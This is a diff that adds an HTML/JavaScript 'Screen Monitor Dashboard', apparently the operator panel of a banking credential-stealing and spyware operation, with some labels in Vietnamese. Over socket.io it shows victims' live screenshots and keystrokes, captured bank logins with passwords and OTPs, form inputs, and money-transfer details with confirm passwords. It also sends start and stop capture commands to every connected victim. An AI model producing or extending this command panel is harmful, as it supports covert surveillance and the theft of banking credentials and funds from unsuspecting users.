@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Screen Monitor Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background: #1a1a1a; color: white; }
+        .header { background: #333; padding: 20px; border-bottom: 2px solid #555; }
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 20px; }
+        .panel { background: #2a2a2a; border-radius: 8px; padding: 15px; }
+        .screenshot { max-width: 100%; height: auto; border: 2px solid #555; border-radius: 4px; }
+        .data-log { max-height: 300px; overflow-y: auto; background: #1e1e1e; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; }
+        .user-session { margin-bottom: 20px; border: 1px solid #555; border-radius: 8px; padding: 15px; }
+        .timestamp { color: #888; font-size: 11px; }
+        .sensitive { color: #ff6b6b; font-weight: bold; }
+        .field-name { color: #4ecdc4; }
+        .status { padding: 5px 10px; border-radius: 15px; font-size: 12px; }
+        .online { background: #28a745; }
+        .offline { background: #dc3545; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🕵️ Screen Monitor Dashboard</h1>
+        <p>Real-time screen capture và keylogger monitoring</p>
+        <div id="stats">
+            <span>Active Users: <span id="userCount">0</span></span>
+            <span style="margin-left: 20px;">Screenshots: <span id="screenshotCount">0</span></span>
+        </div>
+        <div style="margin-top: 15px;">
+            <button id="stopCapture" onclick="stopAllCapture()" style="background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 4px; margin-right: 10px; cursor: pointer;">⏹️ Dừng tất cả capture</button>
+            <button id="startCapture" onclick="startAllCapture()" style="background: #28a745; color: white; border: none; padding: 10px 20px; border-radius: 4px; margin-right: 10px; cursor: pointer;">▶️ Bắt đầu capture</button>
+            <button onclick="clearLogs()" style="background: #6c757d; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">🗑️ Xóa logs</button>
+        </div>
+    </div>
+    
+    <div class="dashboard">
+        <div class="panel">
+            <h3>📸 Live Screenshots</h3>
+            <div id="screenshots"></div>
+        </div>
+        
+        <div class="panel">
+            <h3>⌨️ Keylog Data</h3>
+            <div id="keylogData" class="data-log"></div>
+        </div>
+        
+        <div class="panel">
+            <h3>🔐 Login Attempts</h3>
+            <div id="loginData" class="data-log"></div>
+        </div>
+        
+        <div class="panel">
+            <h3>💰 Form Data</h3>
+            <div id="formData" class="data-log"></div>
+        </div>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const activeUsers = new Map();
+        let screenshotCount = 0;
+        
+        socket.emit('join-admin');
+        
+        // Screen capture data
+        socket.on('screen-capture', (data) => {
+            screenshotCount++;
+            document.getElementById('screenshotCount').textContent = screenshotCount;
+            
+            const screenshotsDiv = document.getElementById('screenshots');
+            const userSession = getOrCreateUserSession(data.userId);
+            
+            userSession.innerHTML = `
+                <div class="user-session">
+                    <h4>👤 User: ${data.userId.substring(0, 8)} <span class="status online">ONLINE</span></h4>
+                    <div class="timestamp">Captured: ${new Date(data.timestamp).toLocaleString()}</div>
+                    <div class="timestamp">URL: ${data.url}</div>
+                    <img src="${data.screenshot}" class="screenshot" alt="User Screen">
+                </div>
+            `;
+            
+            screenshotsDiv.appendChild(userSession);
+            screenshotsDiv.scrollTop = screenshotsDiv.scrollHeight;
+        });
+        
+        // Keylog data
+        socket.on('keylog-data', (data) => {
+            const keylogDiv = document.getElementById('keylogData');
+            const logEntry = document.createElement('div');
+            logEntry.innerHTML = `
+                <div class="timestamp">[${new Date().toLocaleTimeString()}] User: ${data.userId.substring(0, 8)}</div>
+                ${data.map(key => `
+                    <span class="field-name">${key.target}:</span> 
+                    <span class="${key.key.length === 1 ? 'sensitive' : ''}">${key.key}</span>
+                `).join(' ')}
+                <hr style="border-color: #555; margin: 10px 0;">
+            `;
+            keylogDiv.appendChild(logEntry);
+            keylogDiv.scrollTop = keylogDiv.scrollHeight;
+        });
+        
+        // Login attempts
+        socket.on('login-attempt', (data) => {
+            const loginDiv = document.getElementById('loginData');
+            const loginEntry = document.createElement('div');
+            loginEntry.innerHTML = `
+                <div class="timestamp">[${new Date(data.timestamp).toLocaleString()}] User: ${data.userId.substring(0, 8)}</div>
+                <div class="sensitive">🏦 BANKING LOGIN CAPTURED:</div>
+                <div><span class="field-name">Account:</span> <span class="sensitive">${data.account}</span></div>
+                <div><span class="field-name">Password:</span> <span class="sensitive">${data.password}</span></div>
+                <div><span class="field-name">OTP:</span> <span class="sensitive">${data.otp}</span></div>
+                <div><span class="field-name">User Agent:</span> ${data.userAgent}</div>
+                <hr style="border-color: #555; margin: 10px 0;">
+            `;
+            loginDiv.appendChild(loginEntry);
+            loginDiv.scrollTop = loginDiv.scrollHeight;
+        });
+        
+        // Form data
+        socket.on('form-data', (data) => {
+            const formDiv = document.getElementById('formData');
+            const formEntry = document.createElement('div');
+            formEntry.innerHTML = `
+                <div class="timestamp">[${new Date(data.timestamp).toLocaleString()}]</div>
+                <div><span class="field-name">Account:</span> <span class="sensitive">${data.account}</span></div>
+                <div><span class="field-name">Password:</span> <span class="sensitive">${data.password}</span></div>
+                <div><span class="field-name">OTP:</span> <span class="sensitive">${data.otp}</span></div>
+                <hr style="border-color: #555; margin: 10px 0;">
+            `;
+            formDiv.appendChild(formEntry);
+            formDiv.scrollTop = formDiv.scrollHeight;
+        });
+        
+        // Input focus tracking
+        socket.on('input-focus', (data) => {
+            console.log('User focused on:', data.field);
+        });
+        
+        // Input data
+        socket.on('input-data', (data) => {
+            const formDiv = document.getElementById('formData');
+            const inputEntry = document.createElement('div');
+            inputEntry.innerHTML = `
+                <div class="timestamp">[${new Date(data.timestamp).toLocaleString()}]</div>
+                <div><span class="field-name">${data.field}:</span> <span class="sensitive">${data.value}</span></div>
+            `;
+            formDiv.appendChild(inputEntry);
+            formDiv.scrollTop = formDiv.scrollHeight;
+        });
+        
+        // Transfer data
+        socket.on('transfer-data', (data) => {
+            const formDiv = document.getElementById('formData');
+            const transferEntry = document.createElement('div');
+            transferEntry.innerHTML = `
+                <div class="timestamp">[${new Date(data.timestamp).toLocaleString()}]</div>
+                <div class="sensitive">💸 TRANSFER CAPTURED:</div>
+                <div><span class="field-name">To Account:</span> <span class="sensitive">${data.toAccount}</span></div>
+                <div><span class="field-name">Amount:</span> <span class="sensitive">${data.amount}</span></div>
+                <div><span class="field-name">Confirm Password:</span> <span class="sensitive">${data.confirmPass}</span></div>
+                <hr style="border-color: #555; margin: 10px 0;">
+            `;
+            formDiv.appendChild(transferEntry);
+            formDiv.scrollTop = formDiv.scrollHeight;
+        });
+        
+        function getOrCreateUserSession(userId) {
+            if (!activeUsers.has(userId)) {
+                const userSession = document.createElement('div');
+                activeUsers.set(userId, userSession);
+                updateUserCount();
+            }
+            return activeUsers.get(userId);
+        }
+        
+        function updateUserCount() {
+            document.getElementById('userCount').textContent = activeUsers.size;
+        }
+        
+        // Cleanup disconnected users
+        socket.on('user-disconnected', (userId) => {
+            if (activeUsers.has(userId)) {
+                activeUsers.delete(userId);
+                updateUserCount();
+            }
+        });
+        
+        // Control functions
+        function stopAllCapture() {
+            socket.emit('admin-command', { action: 'stop-capture' });
+            document.getElementById('stopCapture').style.background = '#6c757d';
+            document.getElementById('startCapture').style.background = '#28a745';
+            console.log('Sent stop capture command to all users');
+        }
+        
+        function startAllCapture() {
+            socket.emit('admin-command', { action: 'start-capture' });
+            document.getElementById('startCapture').style.background = '#6c757d';
+            document.getElementById('stopCapture').style.background = '#dc3545';
+            console.log('Sent start capture command to all users');
+        }
+        
+        function clearLogs() {
+            document.getElementById('keylogData').innerHTML = '';
+            document.getElementById('loginData').innerHTML = '';
+            document.getElementById('formData').innerHTML = '';
+            document.getElementById('screenshots').innerHTML = '';
+            screenshotCount = 0;
+            document.getElementById('screenshotCount').textContent = '0';
+            console.log('Cleared all logs');
+        }
+    </script>
+</body>
+</html>
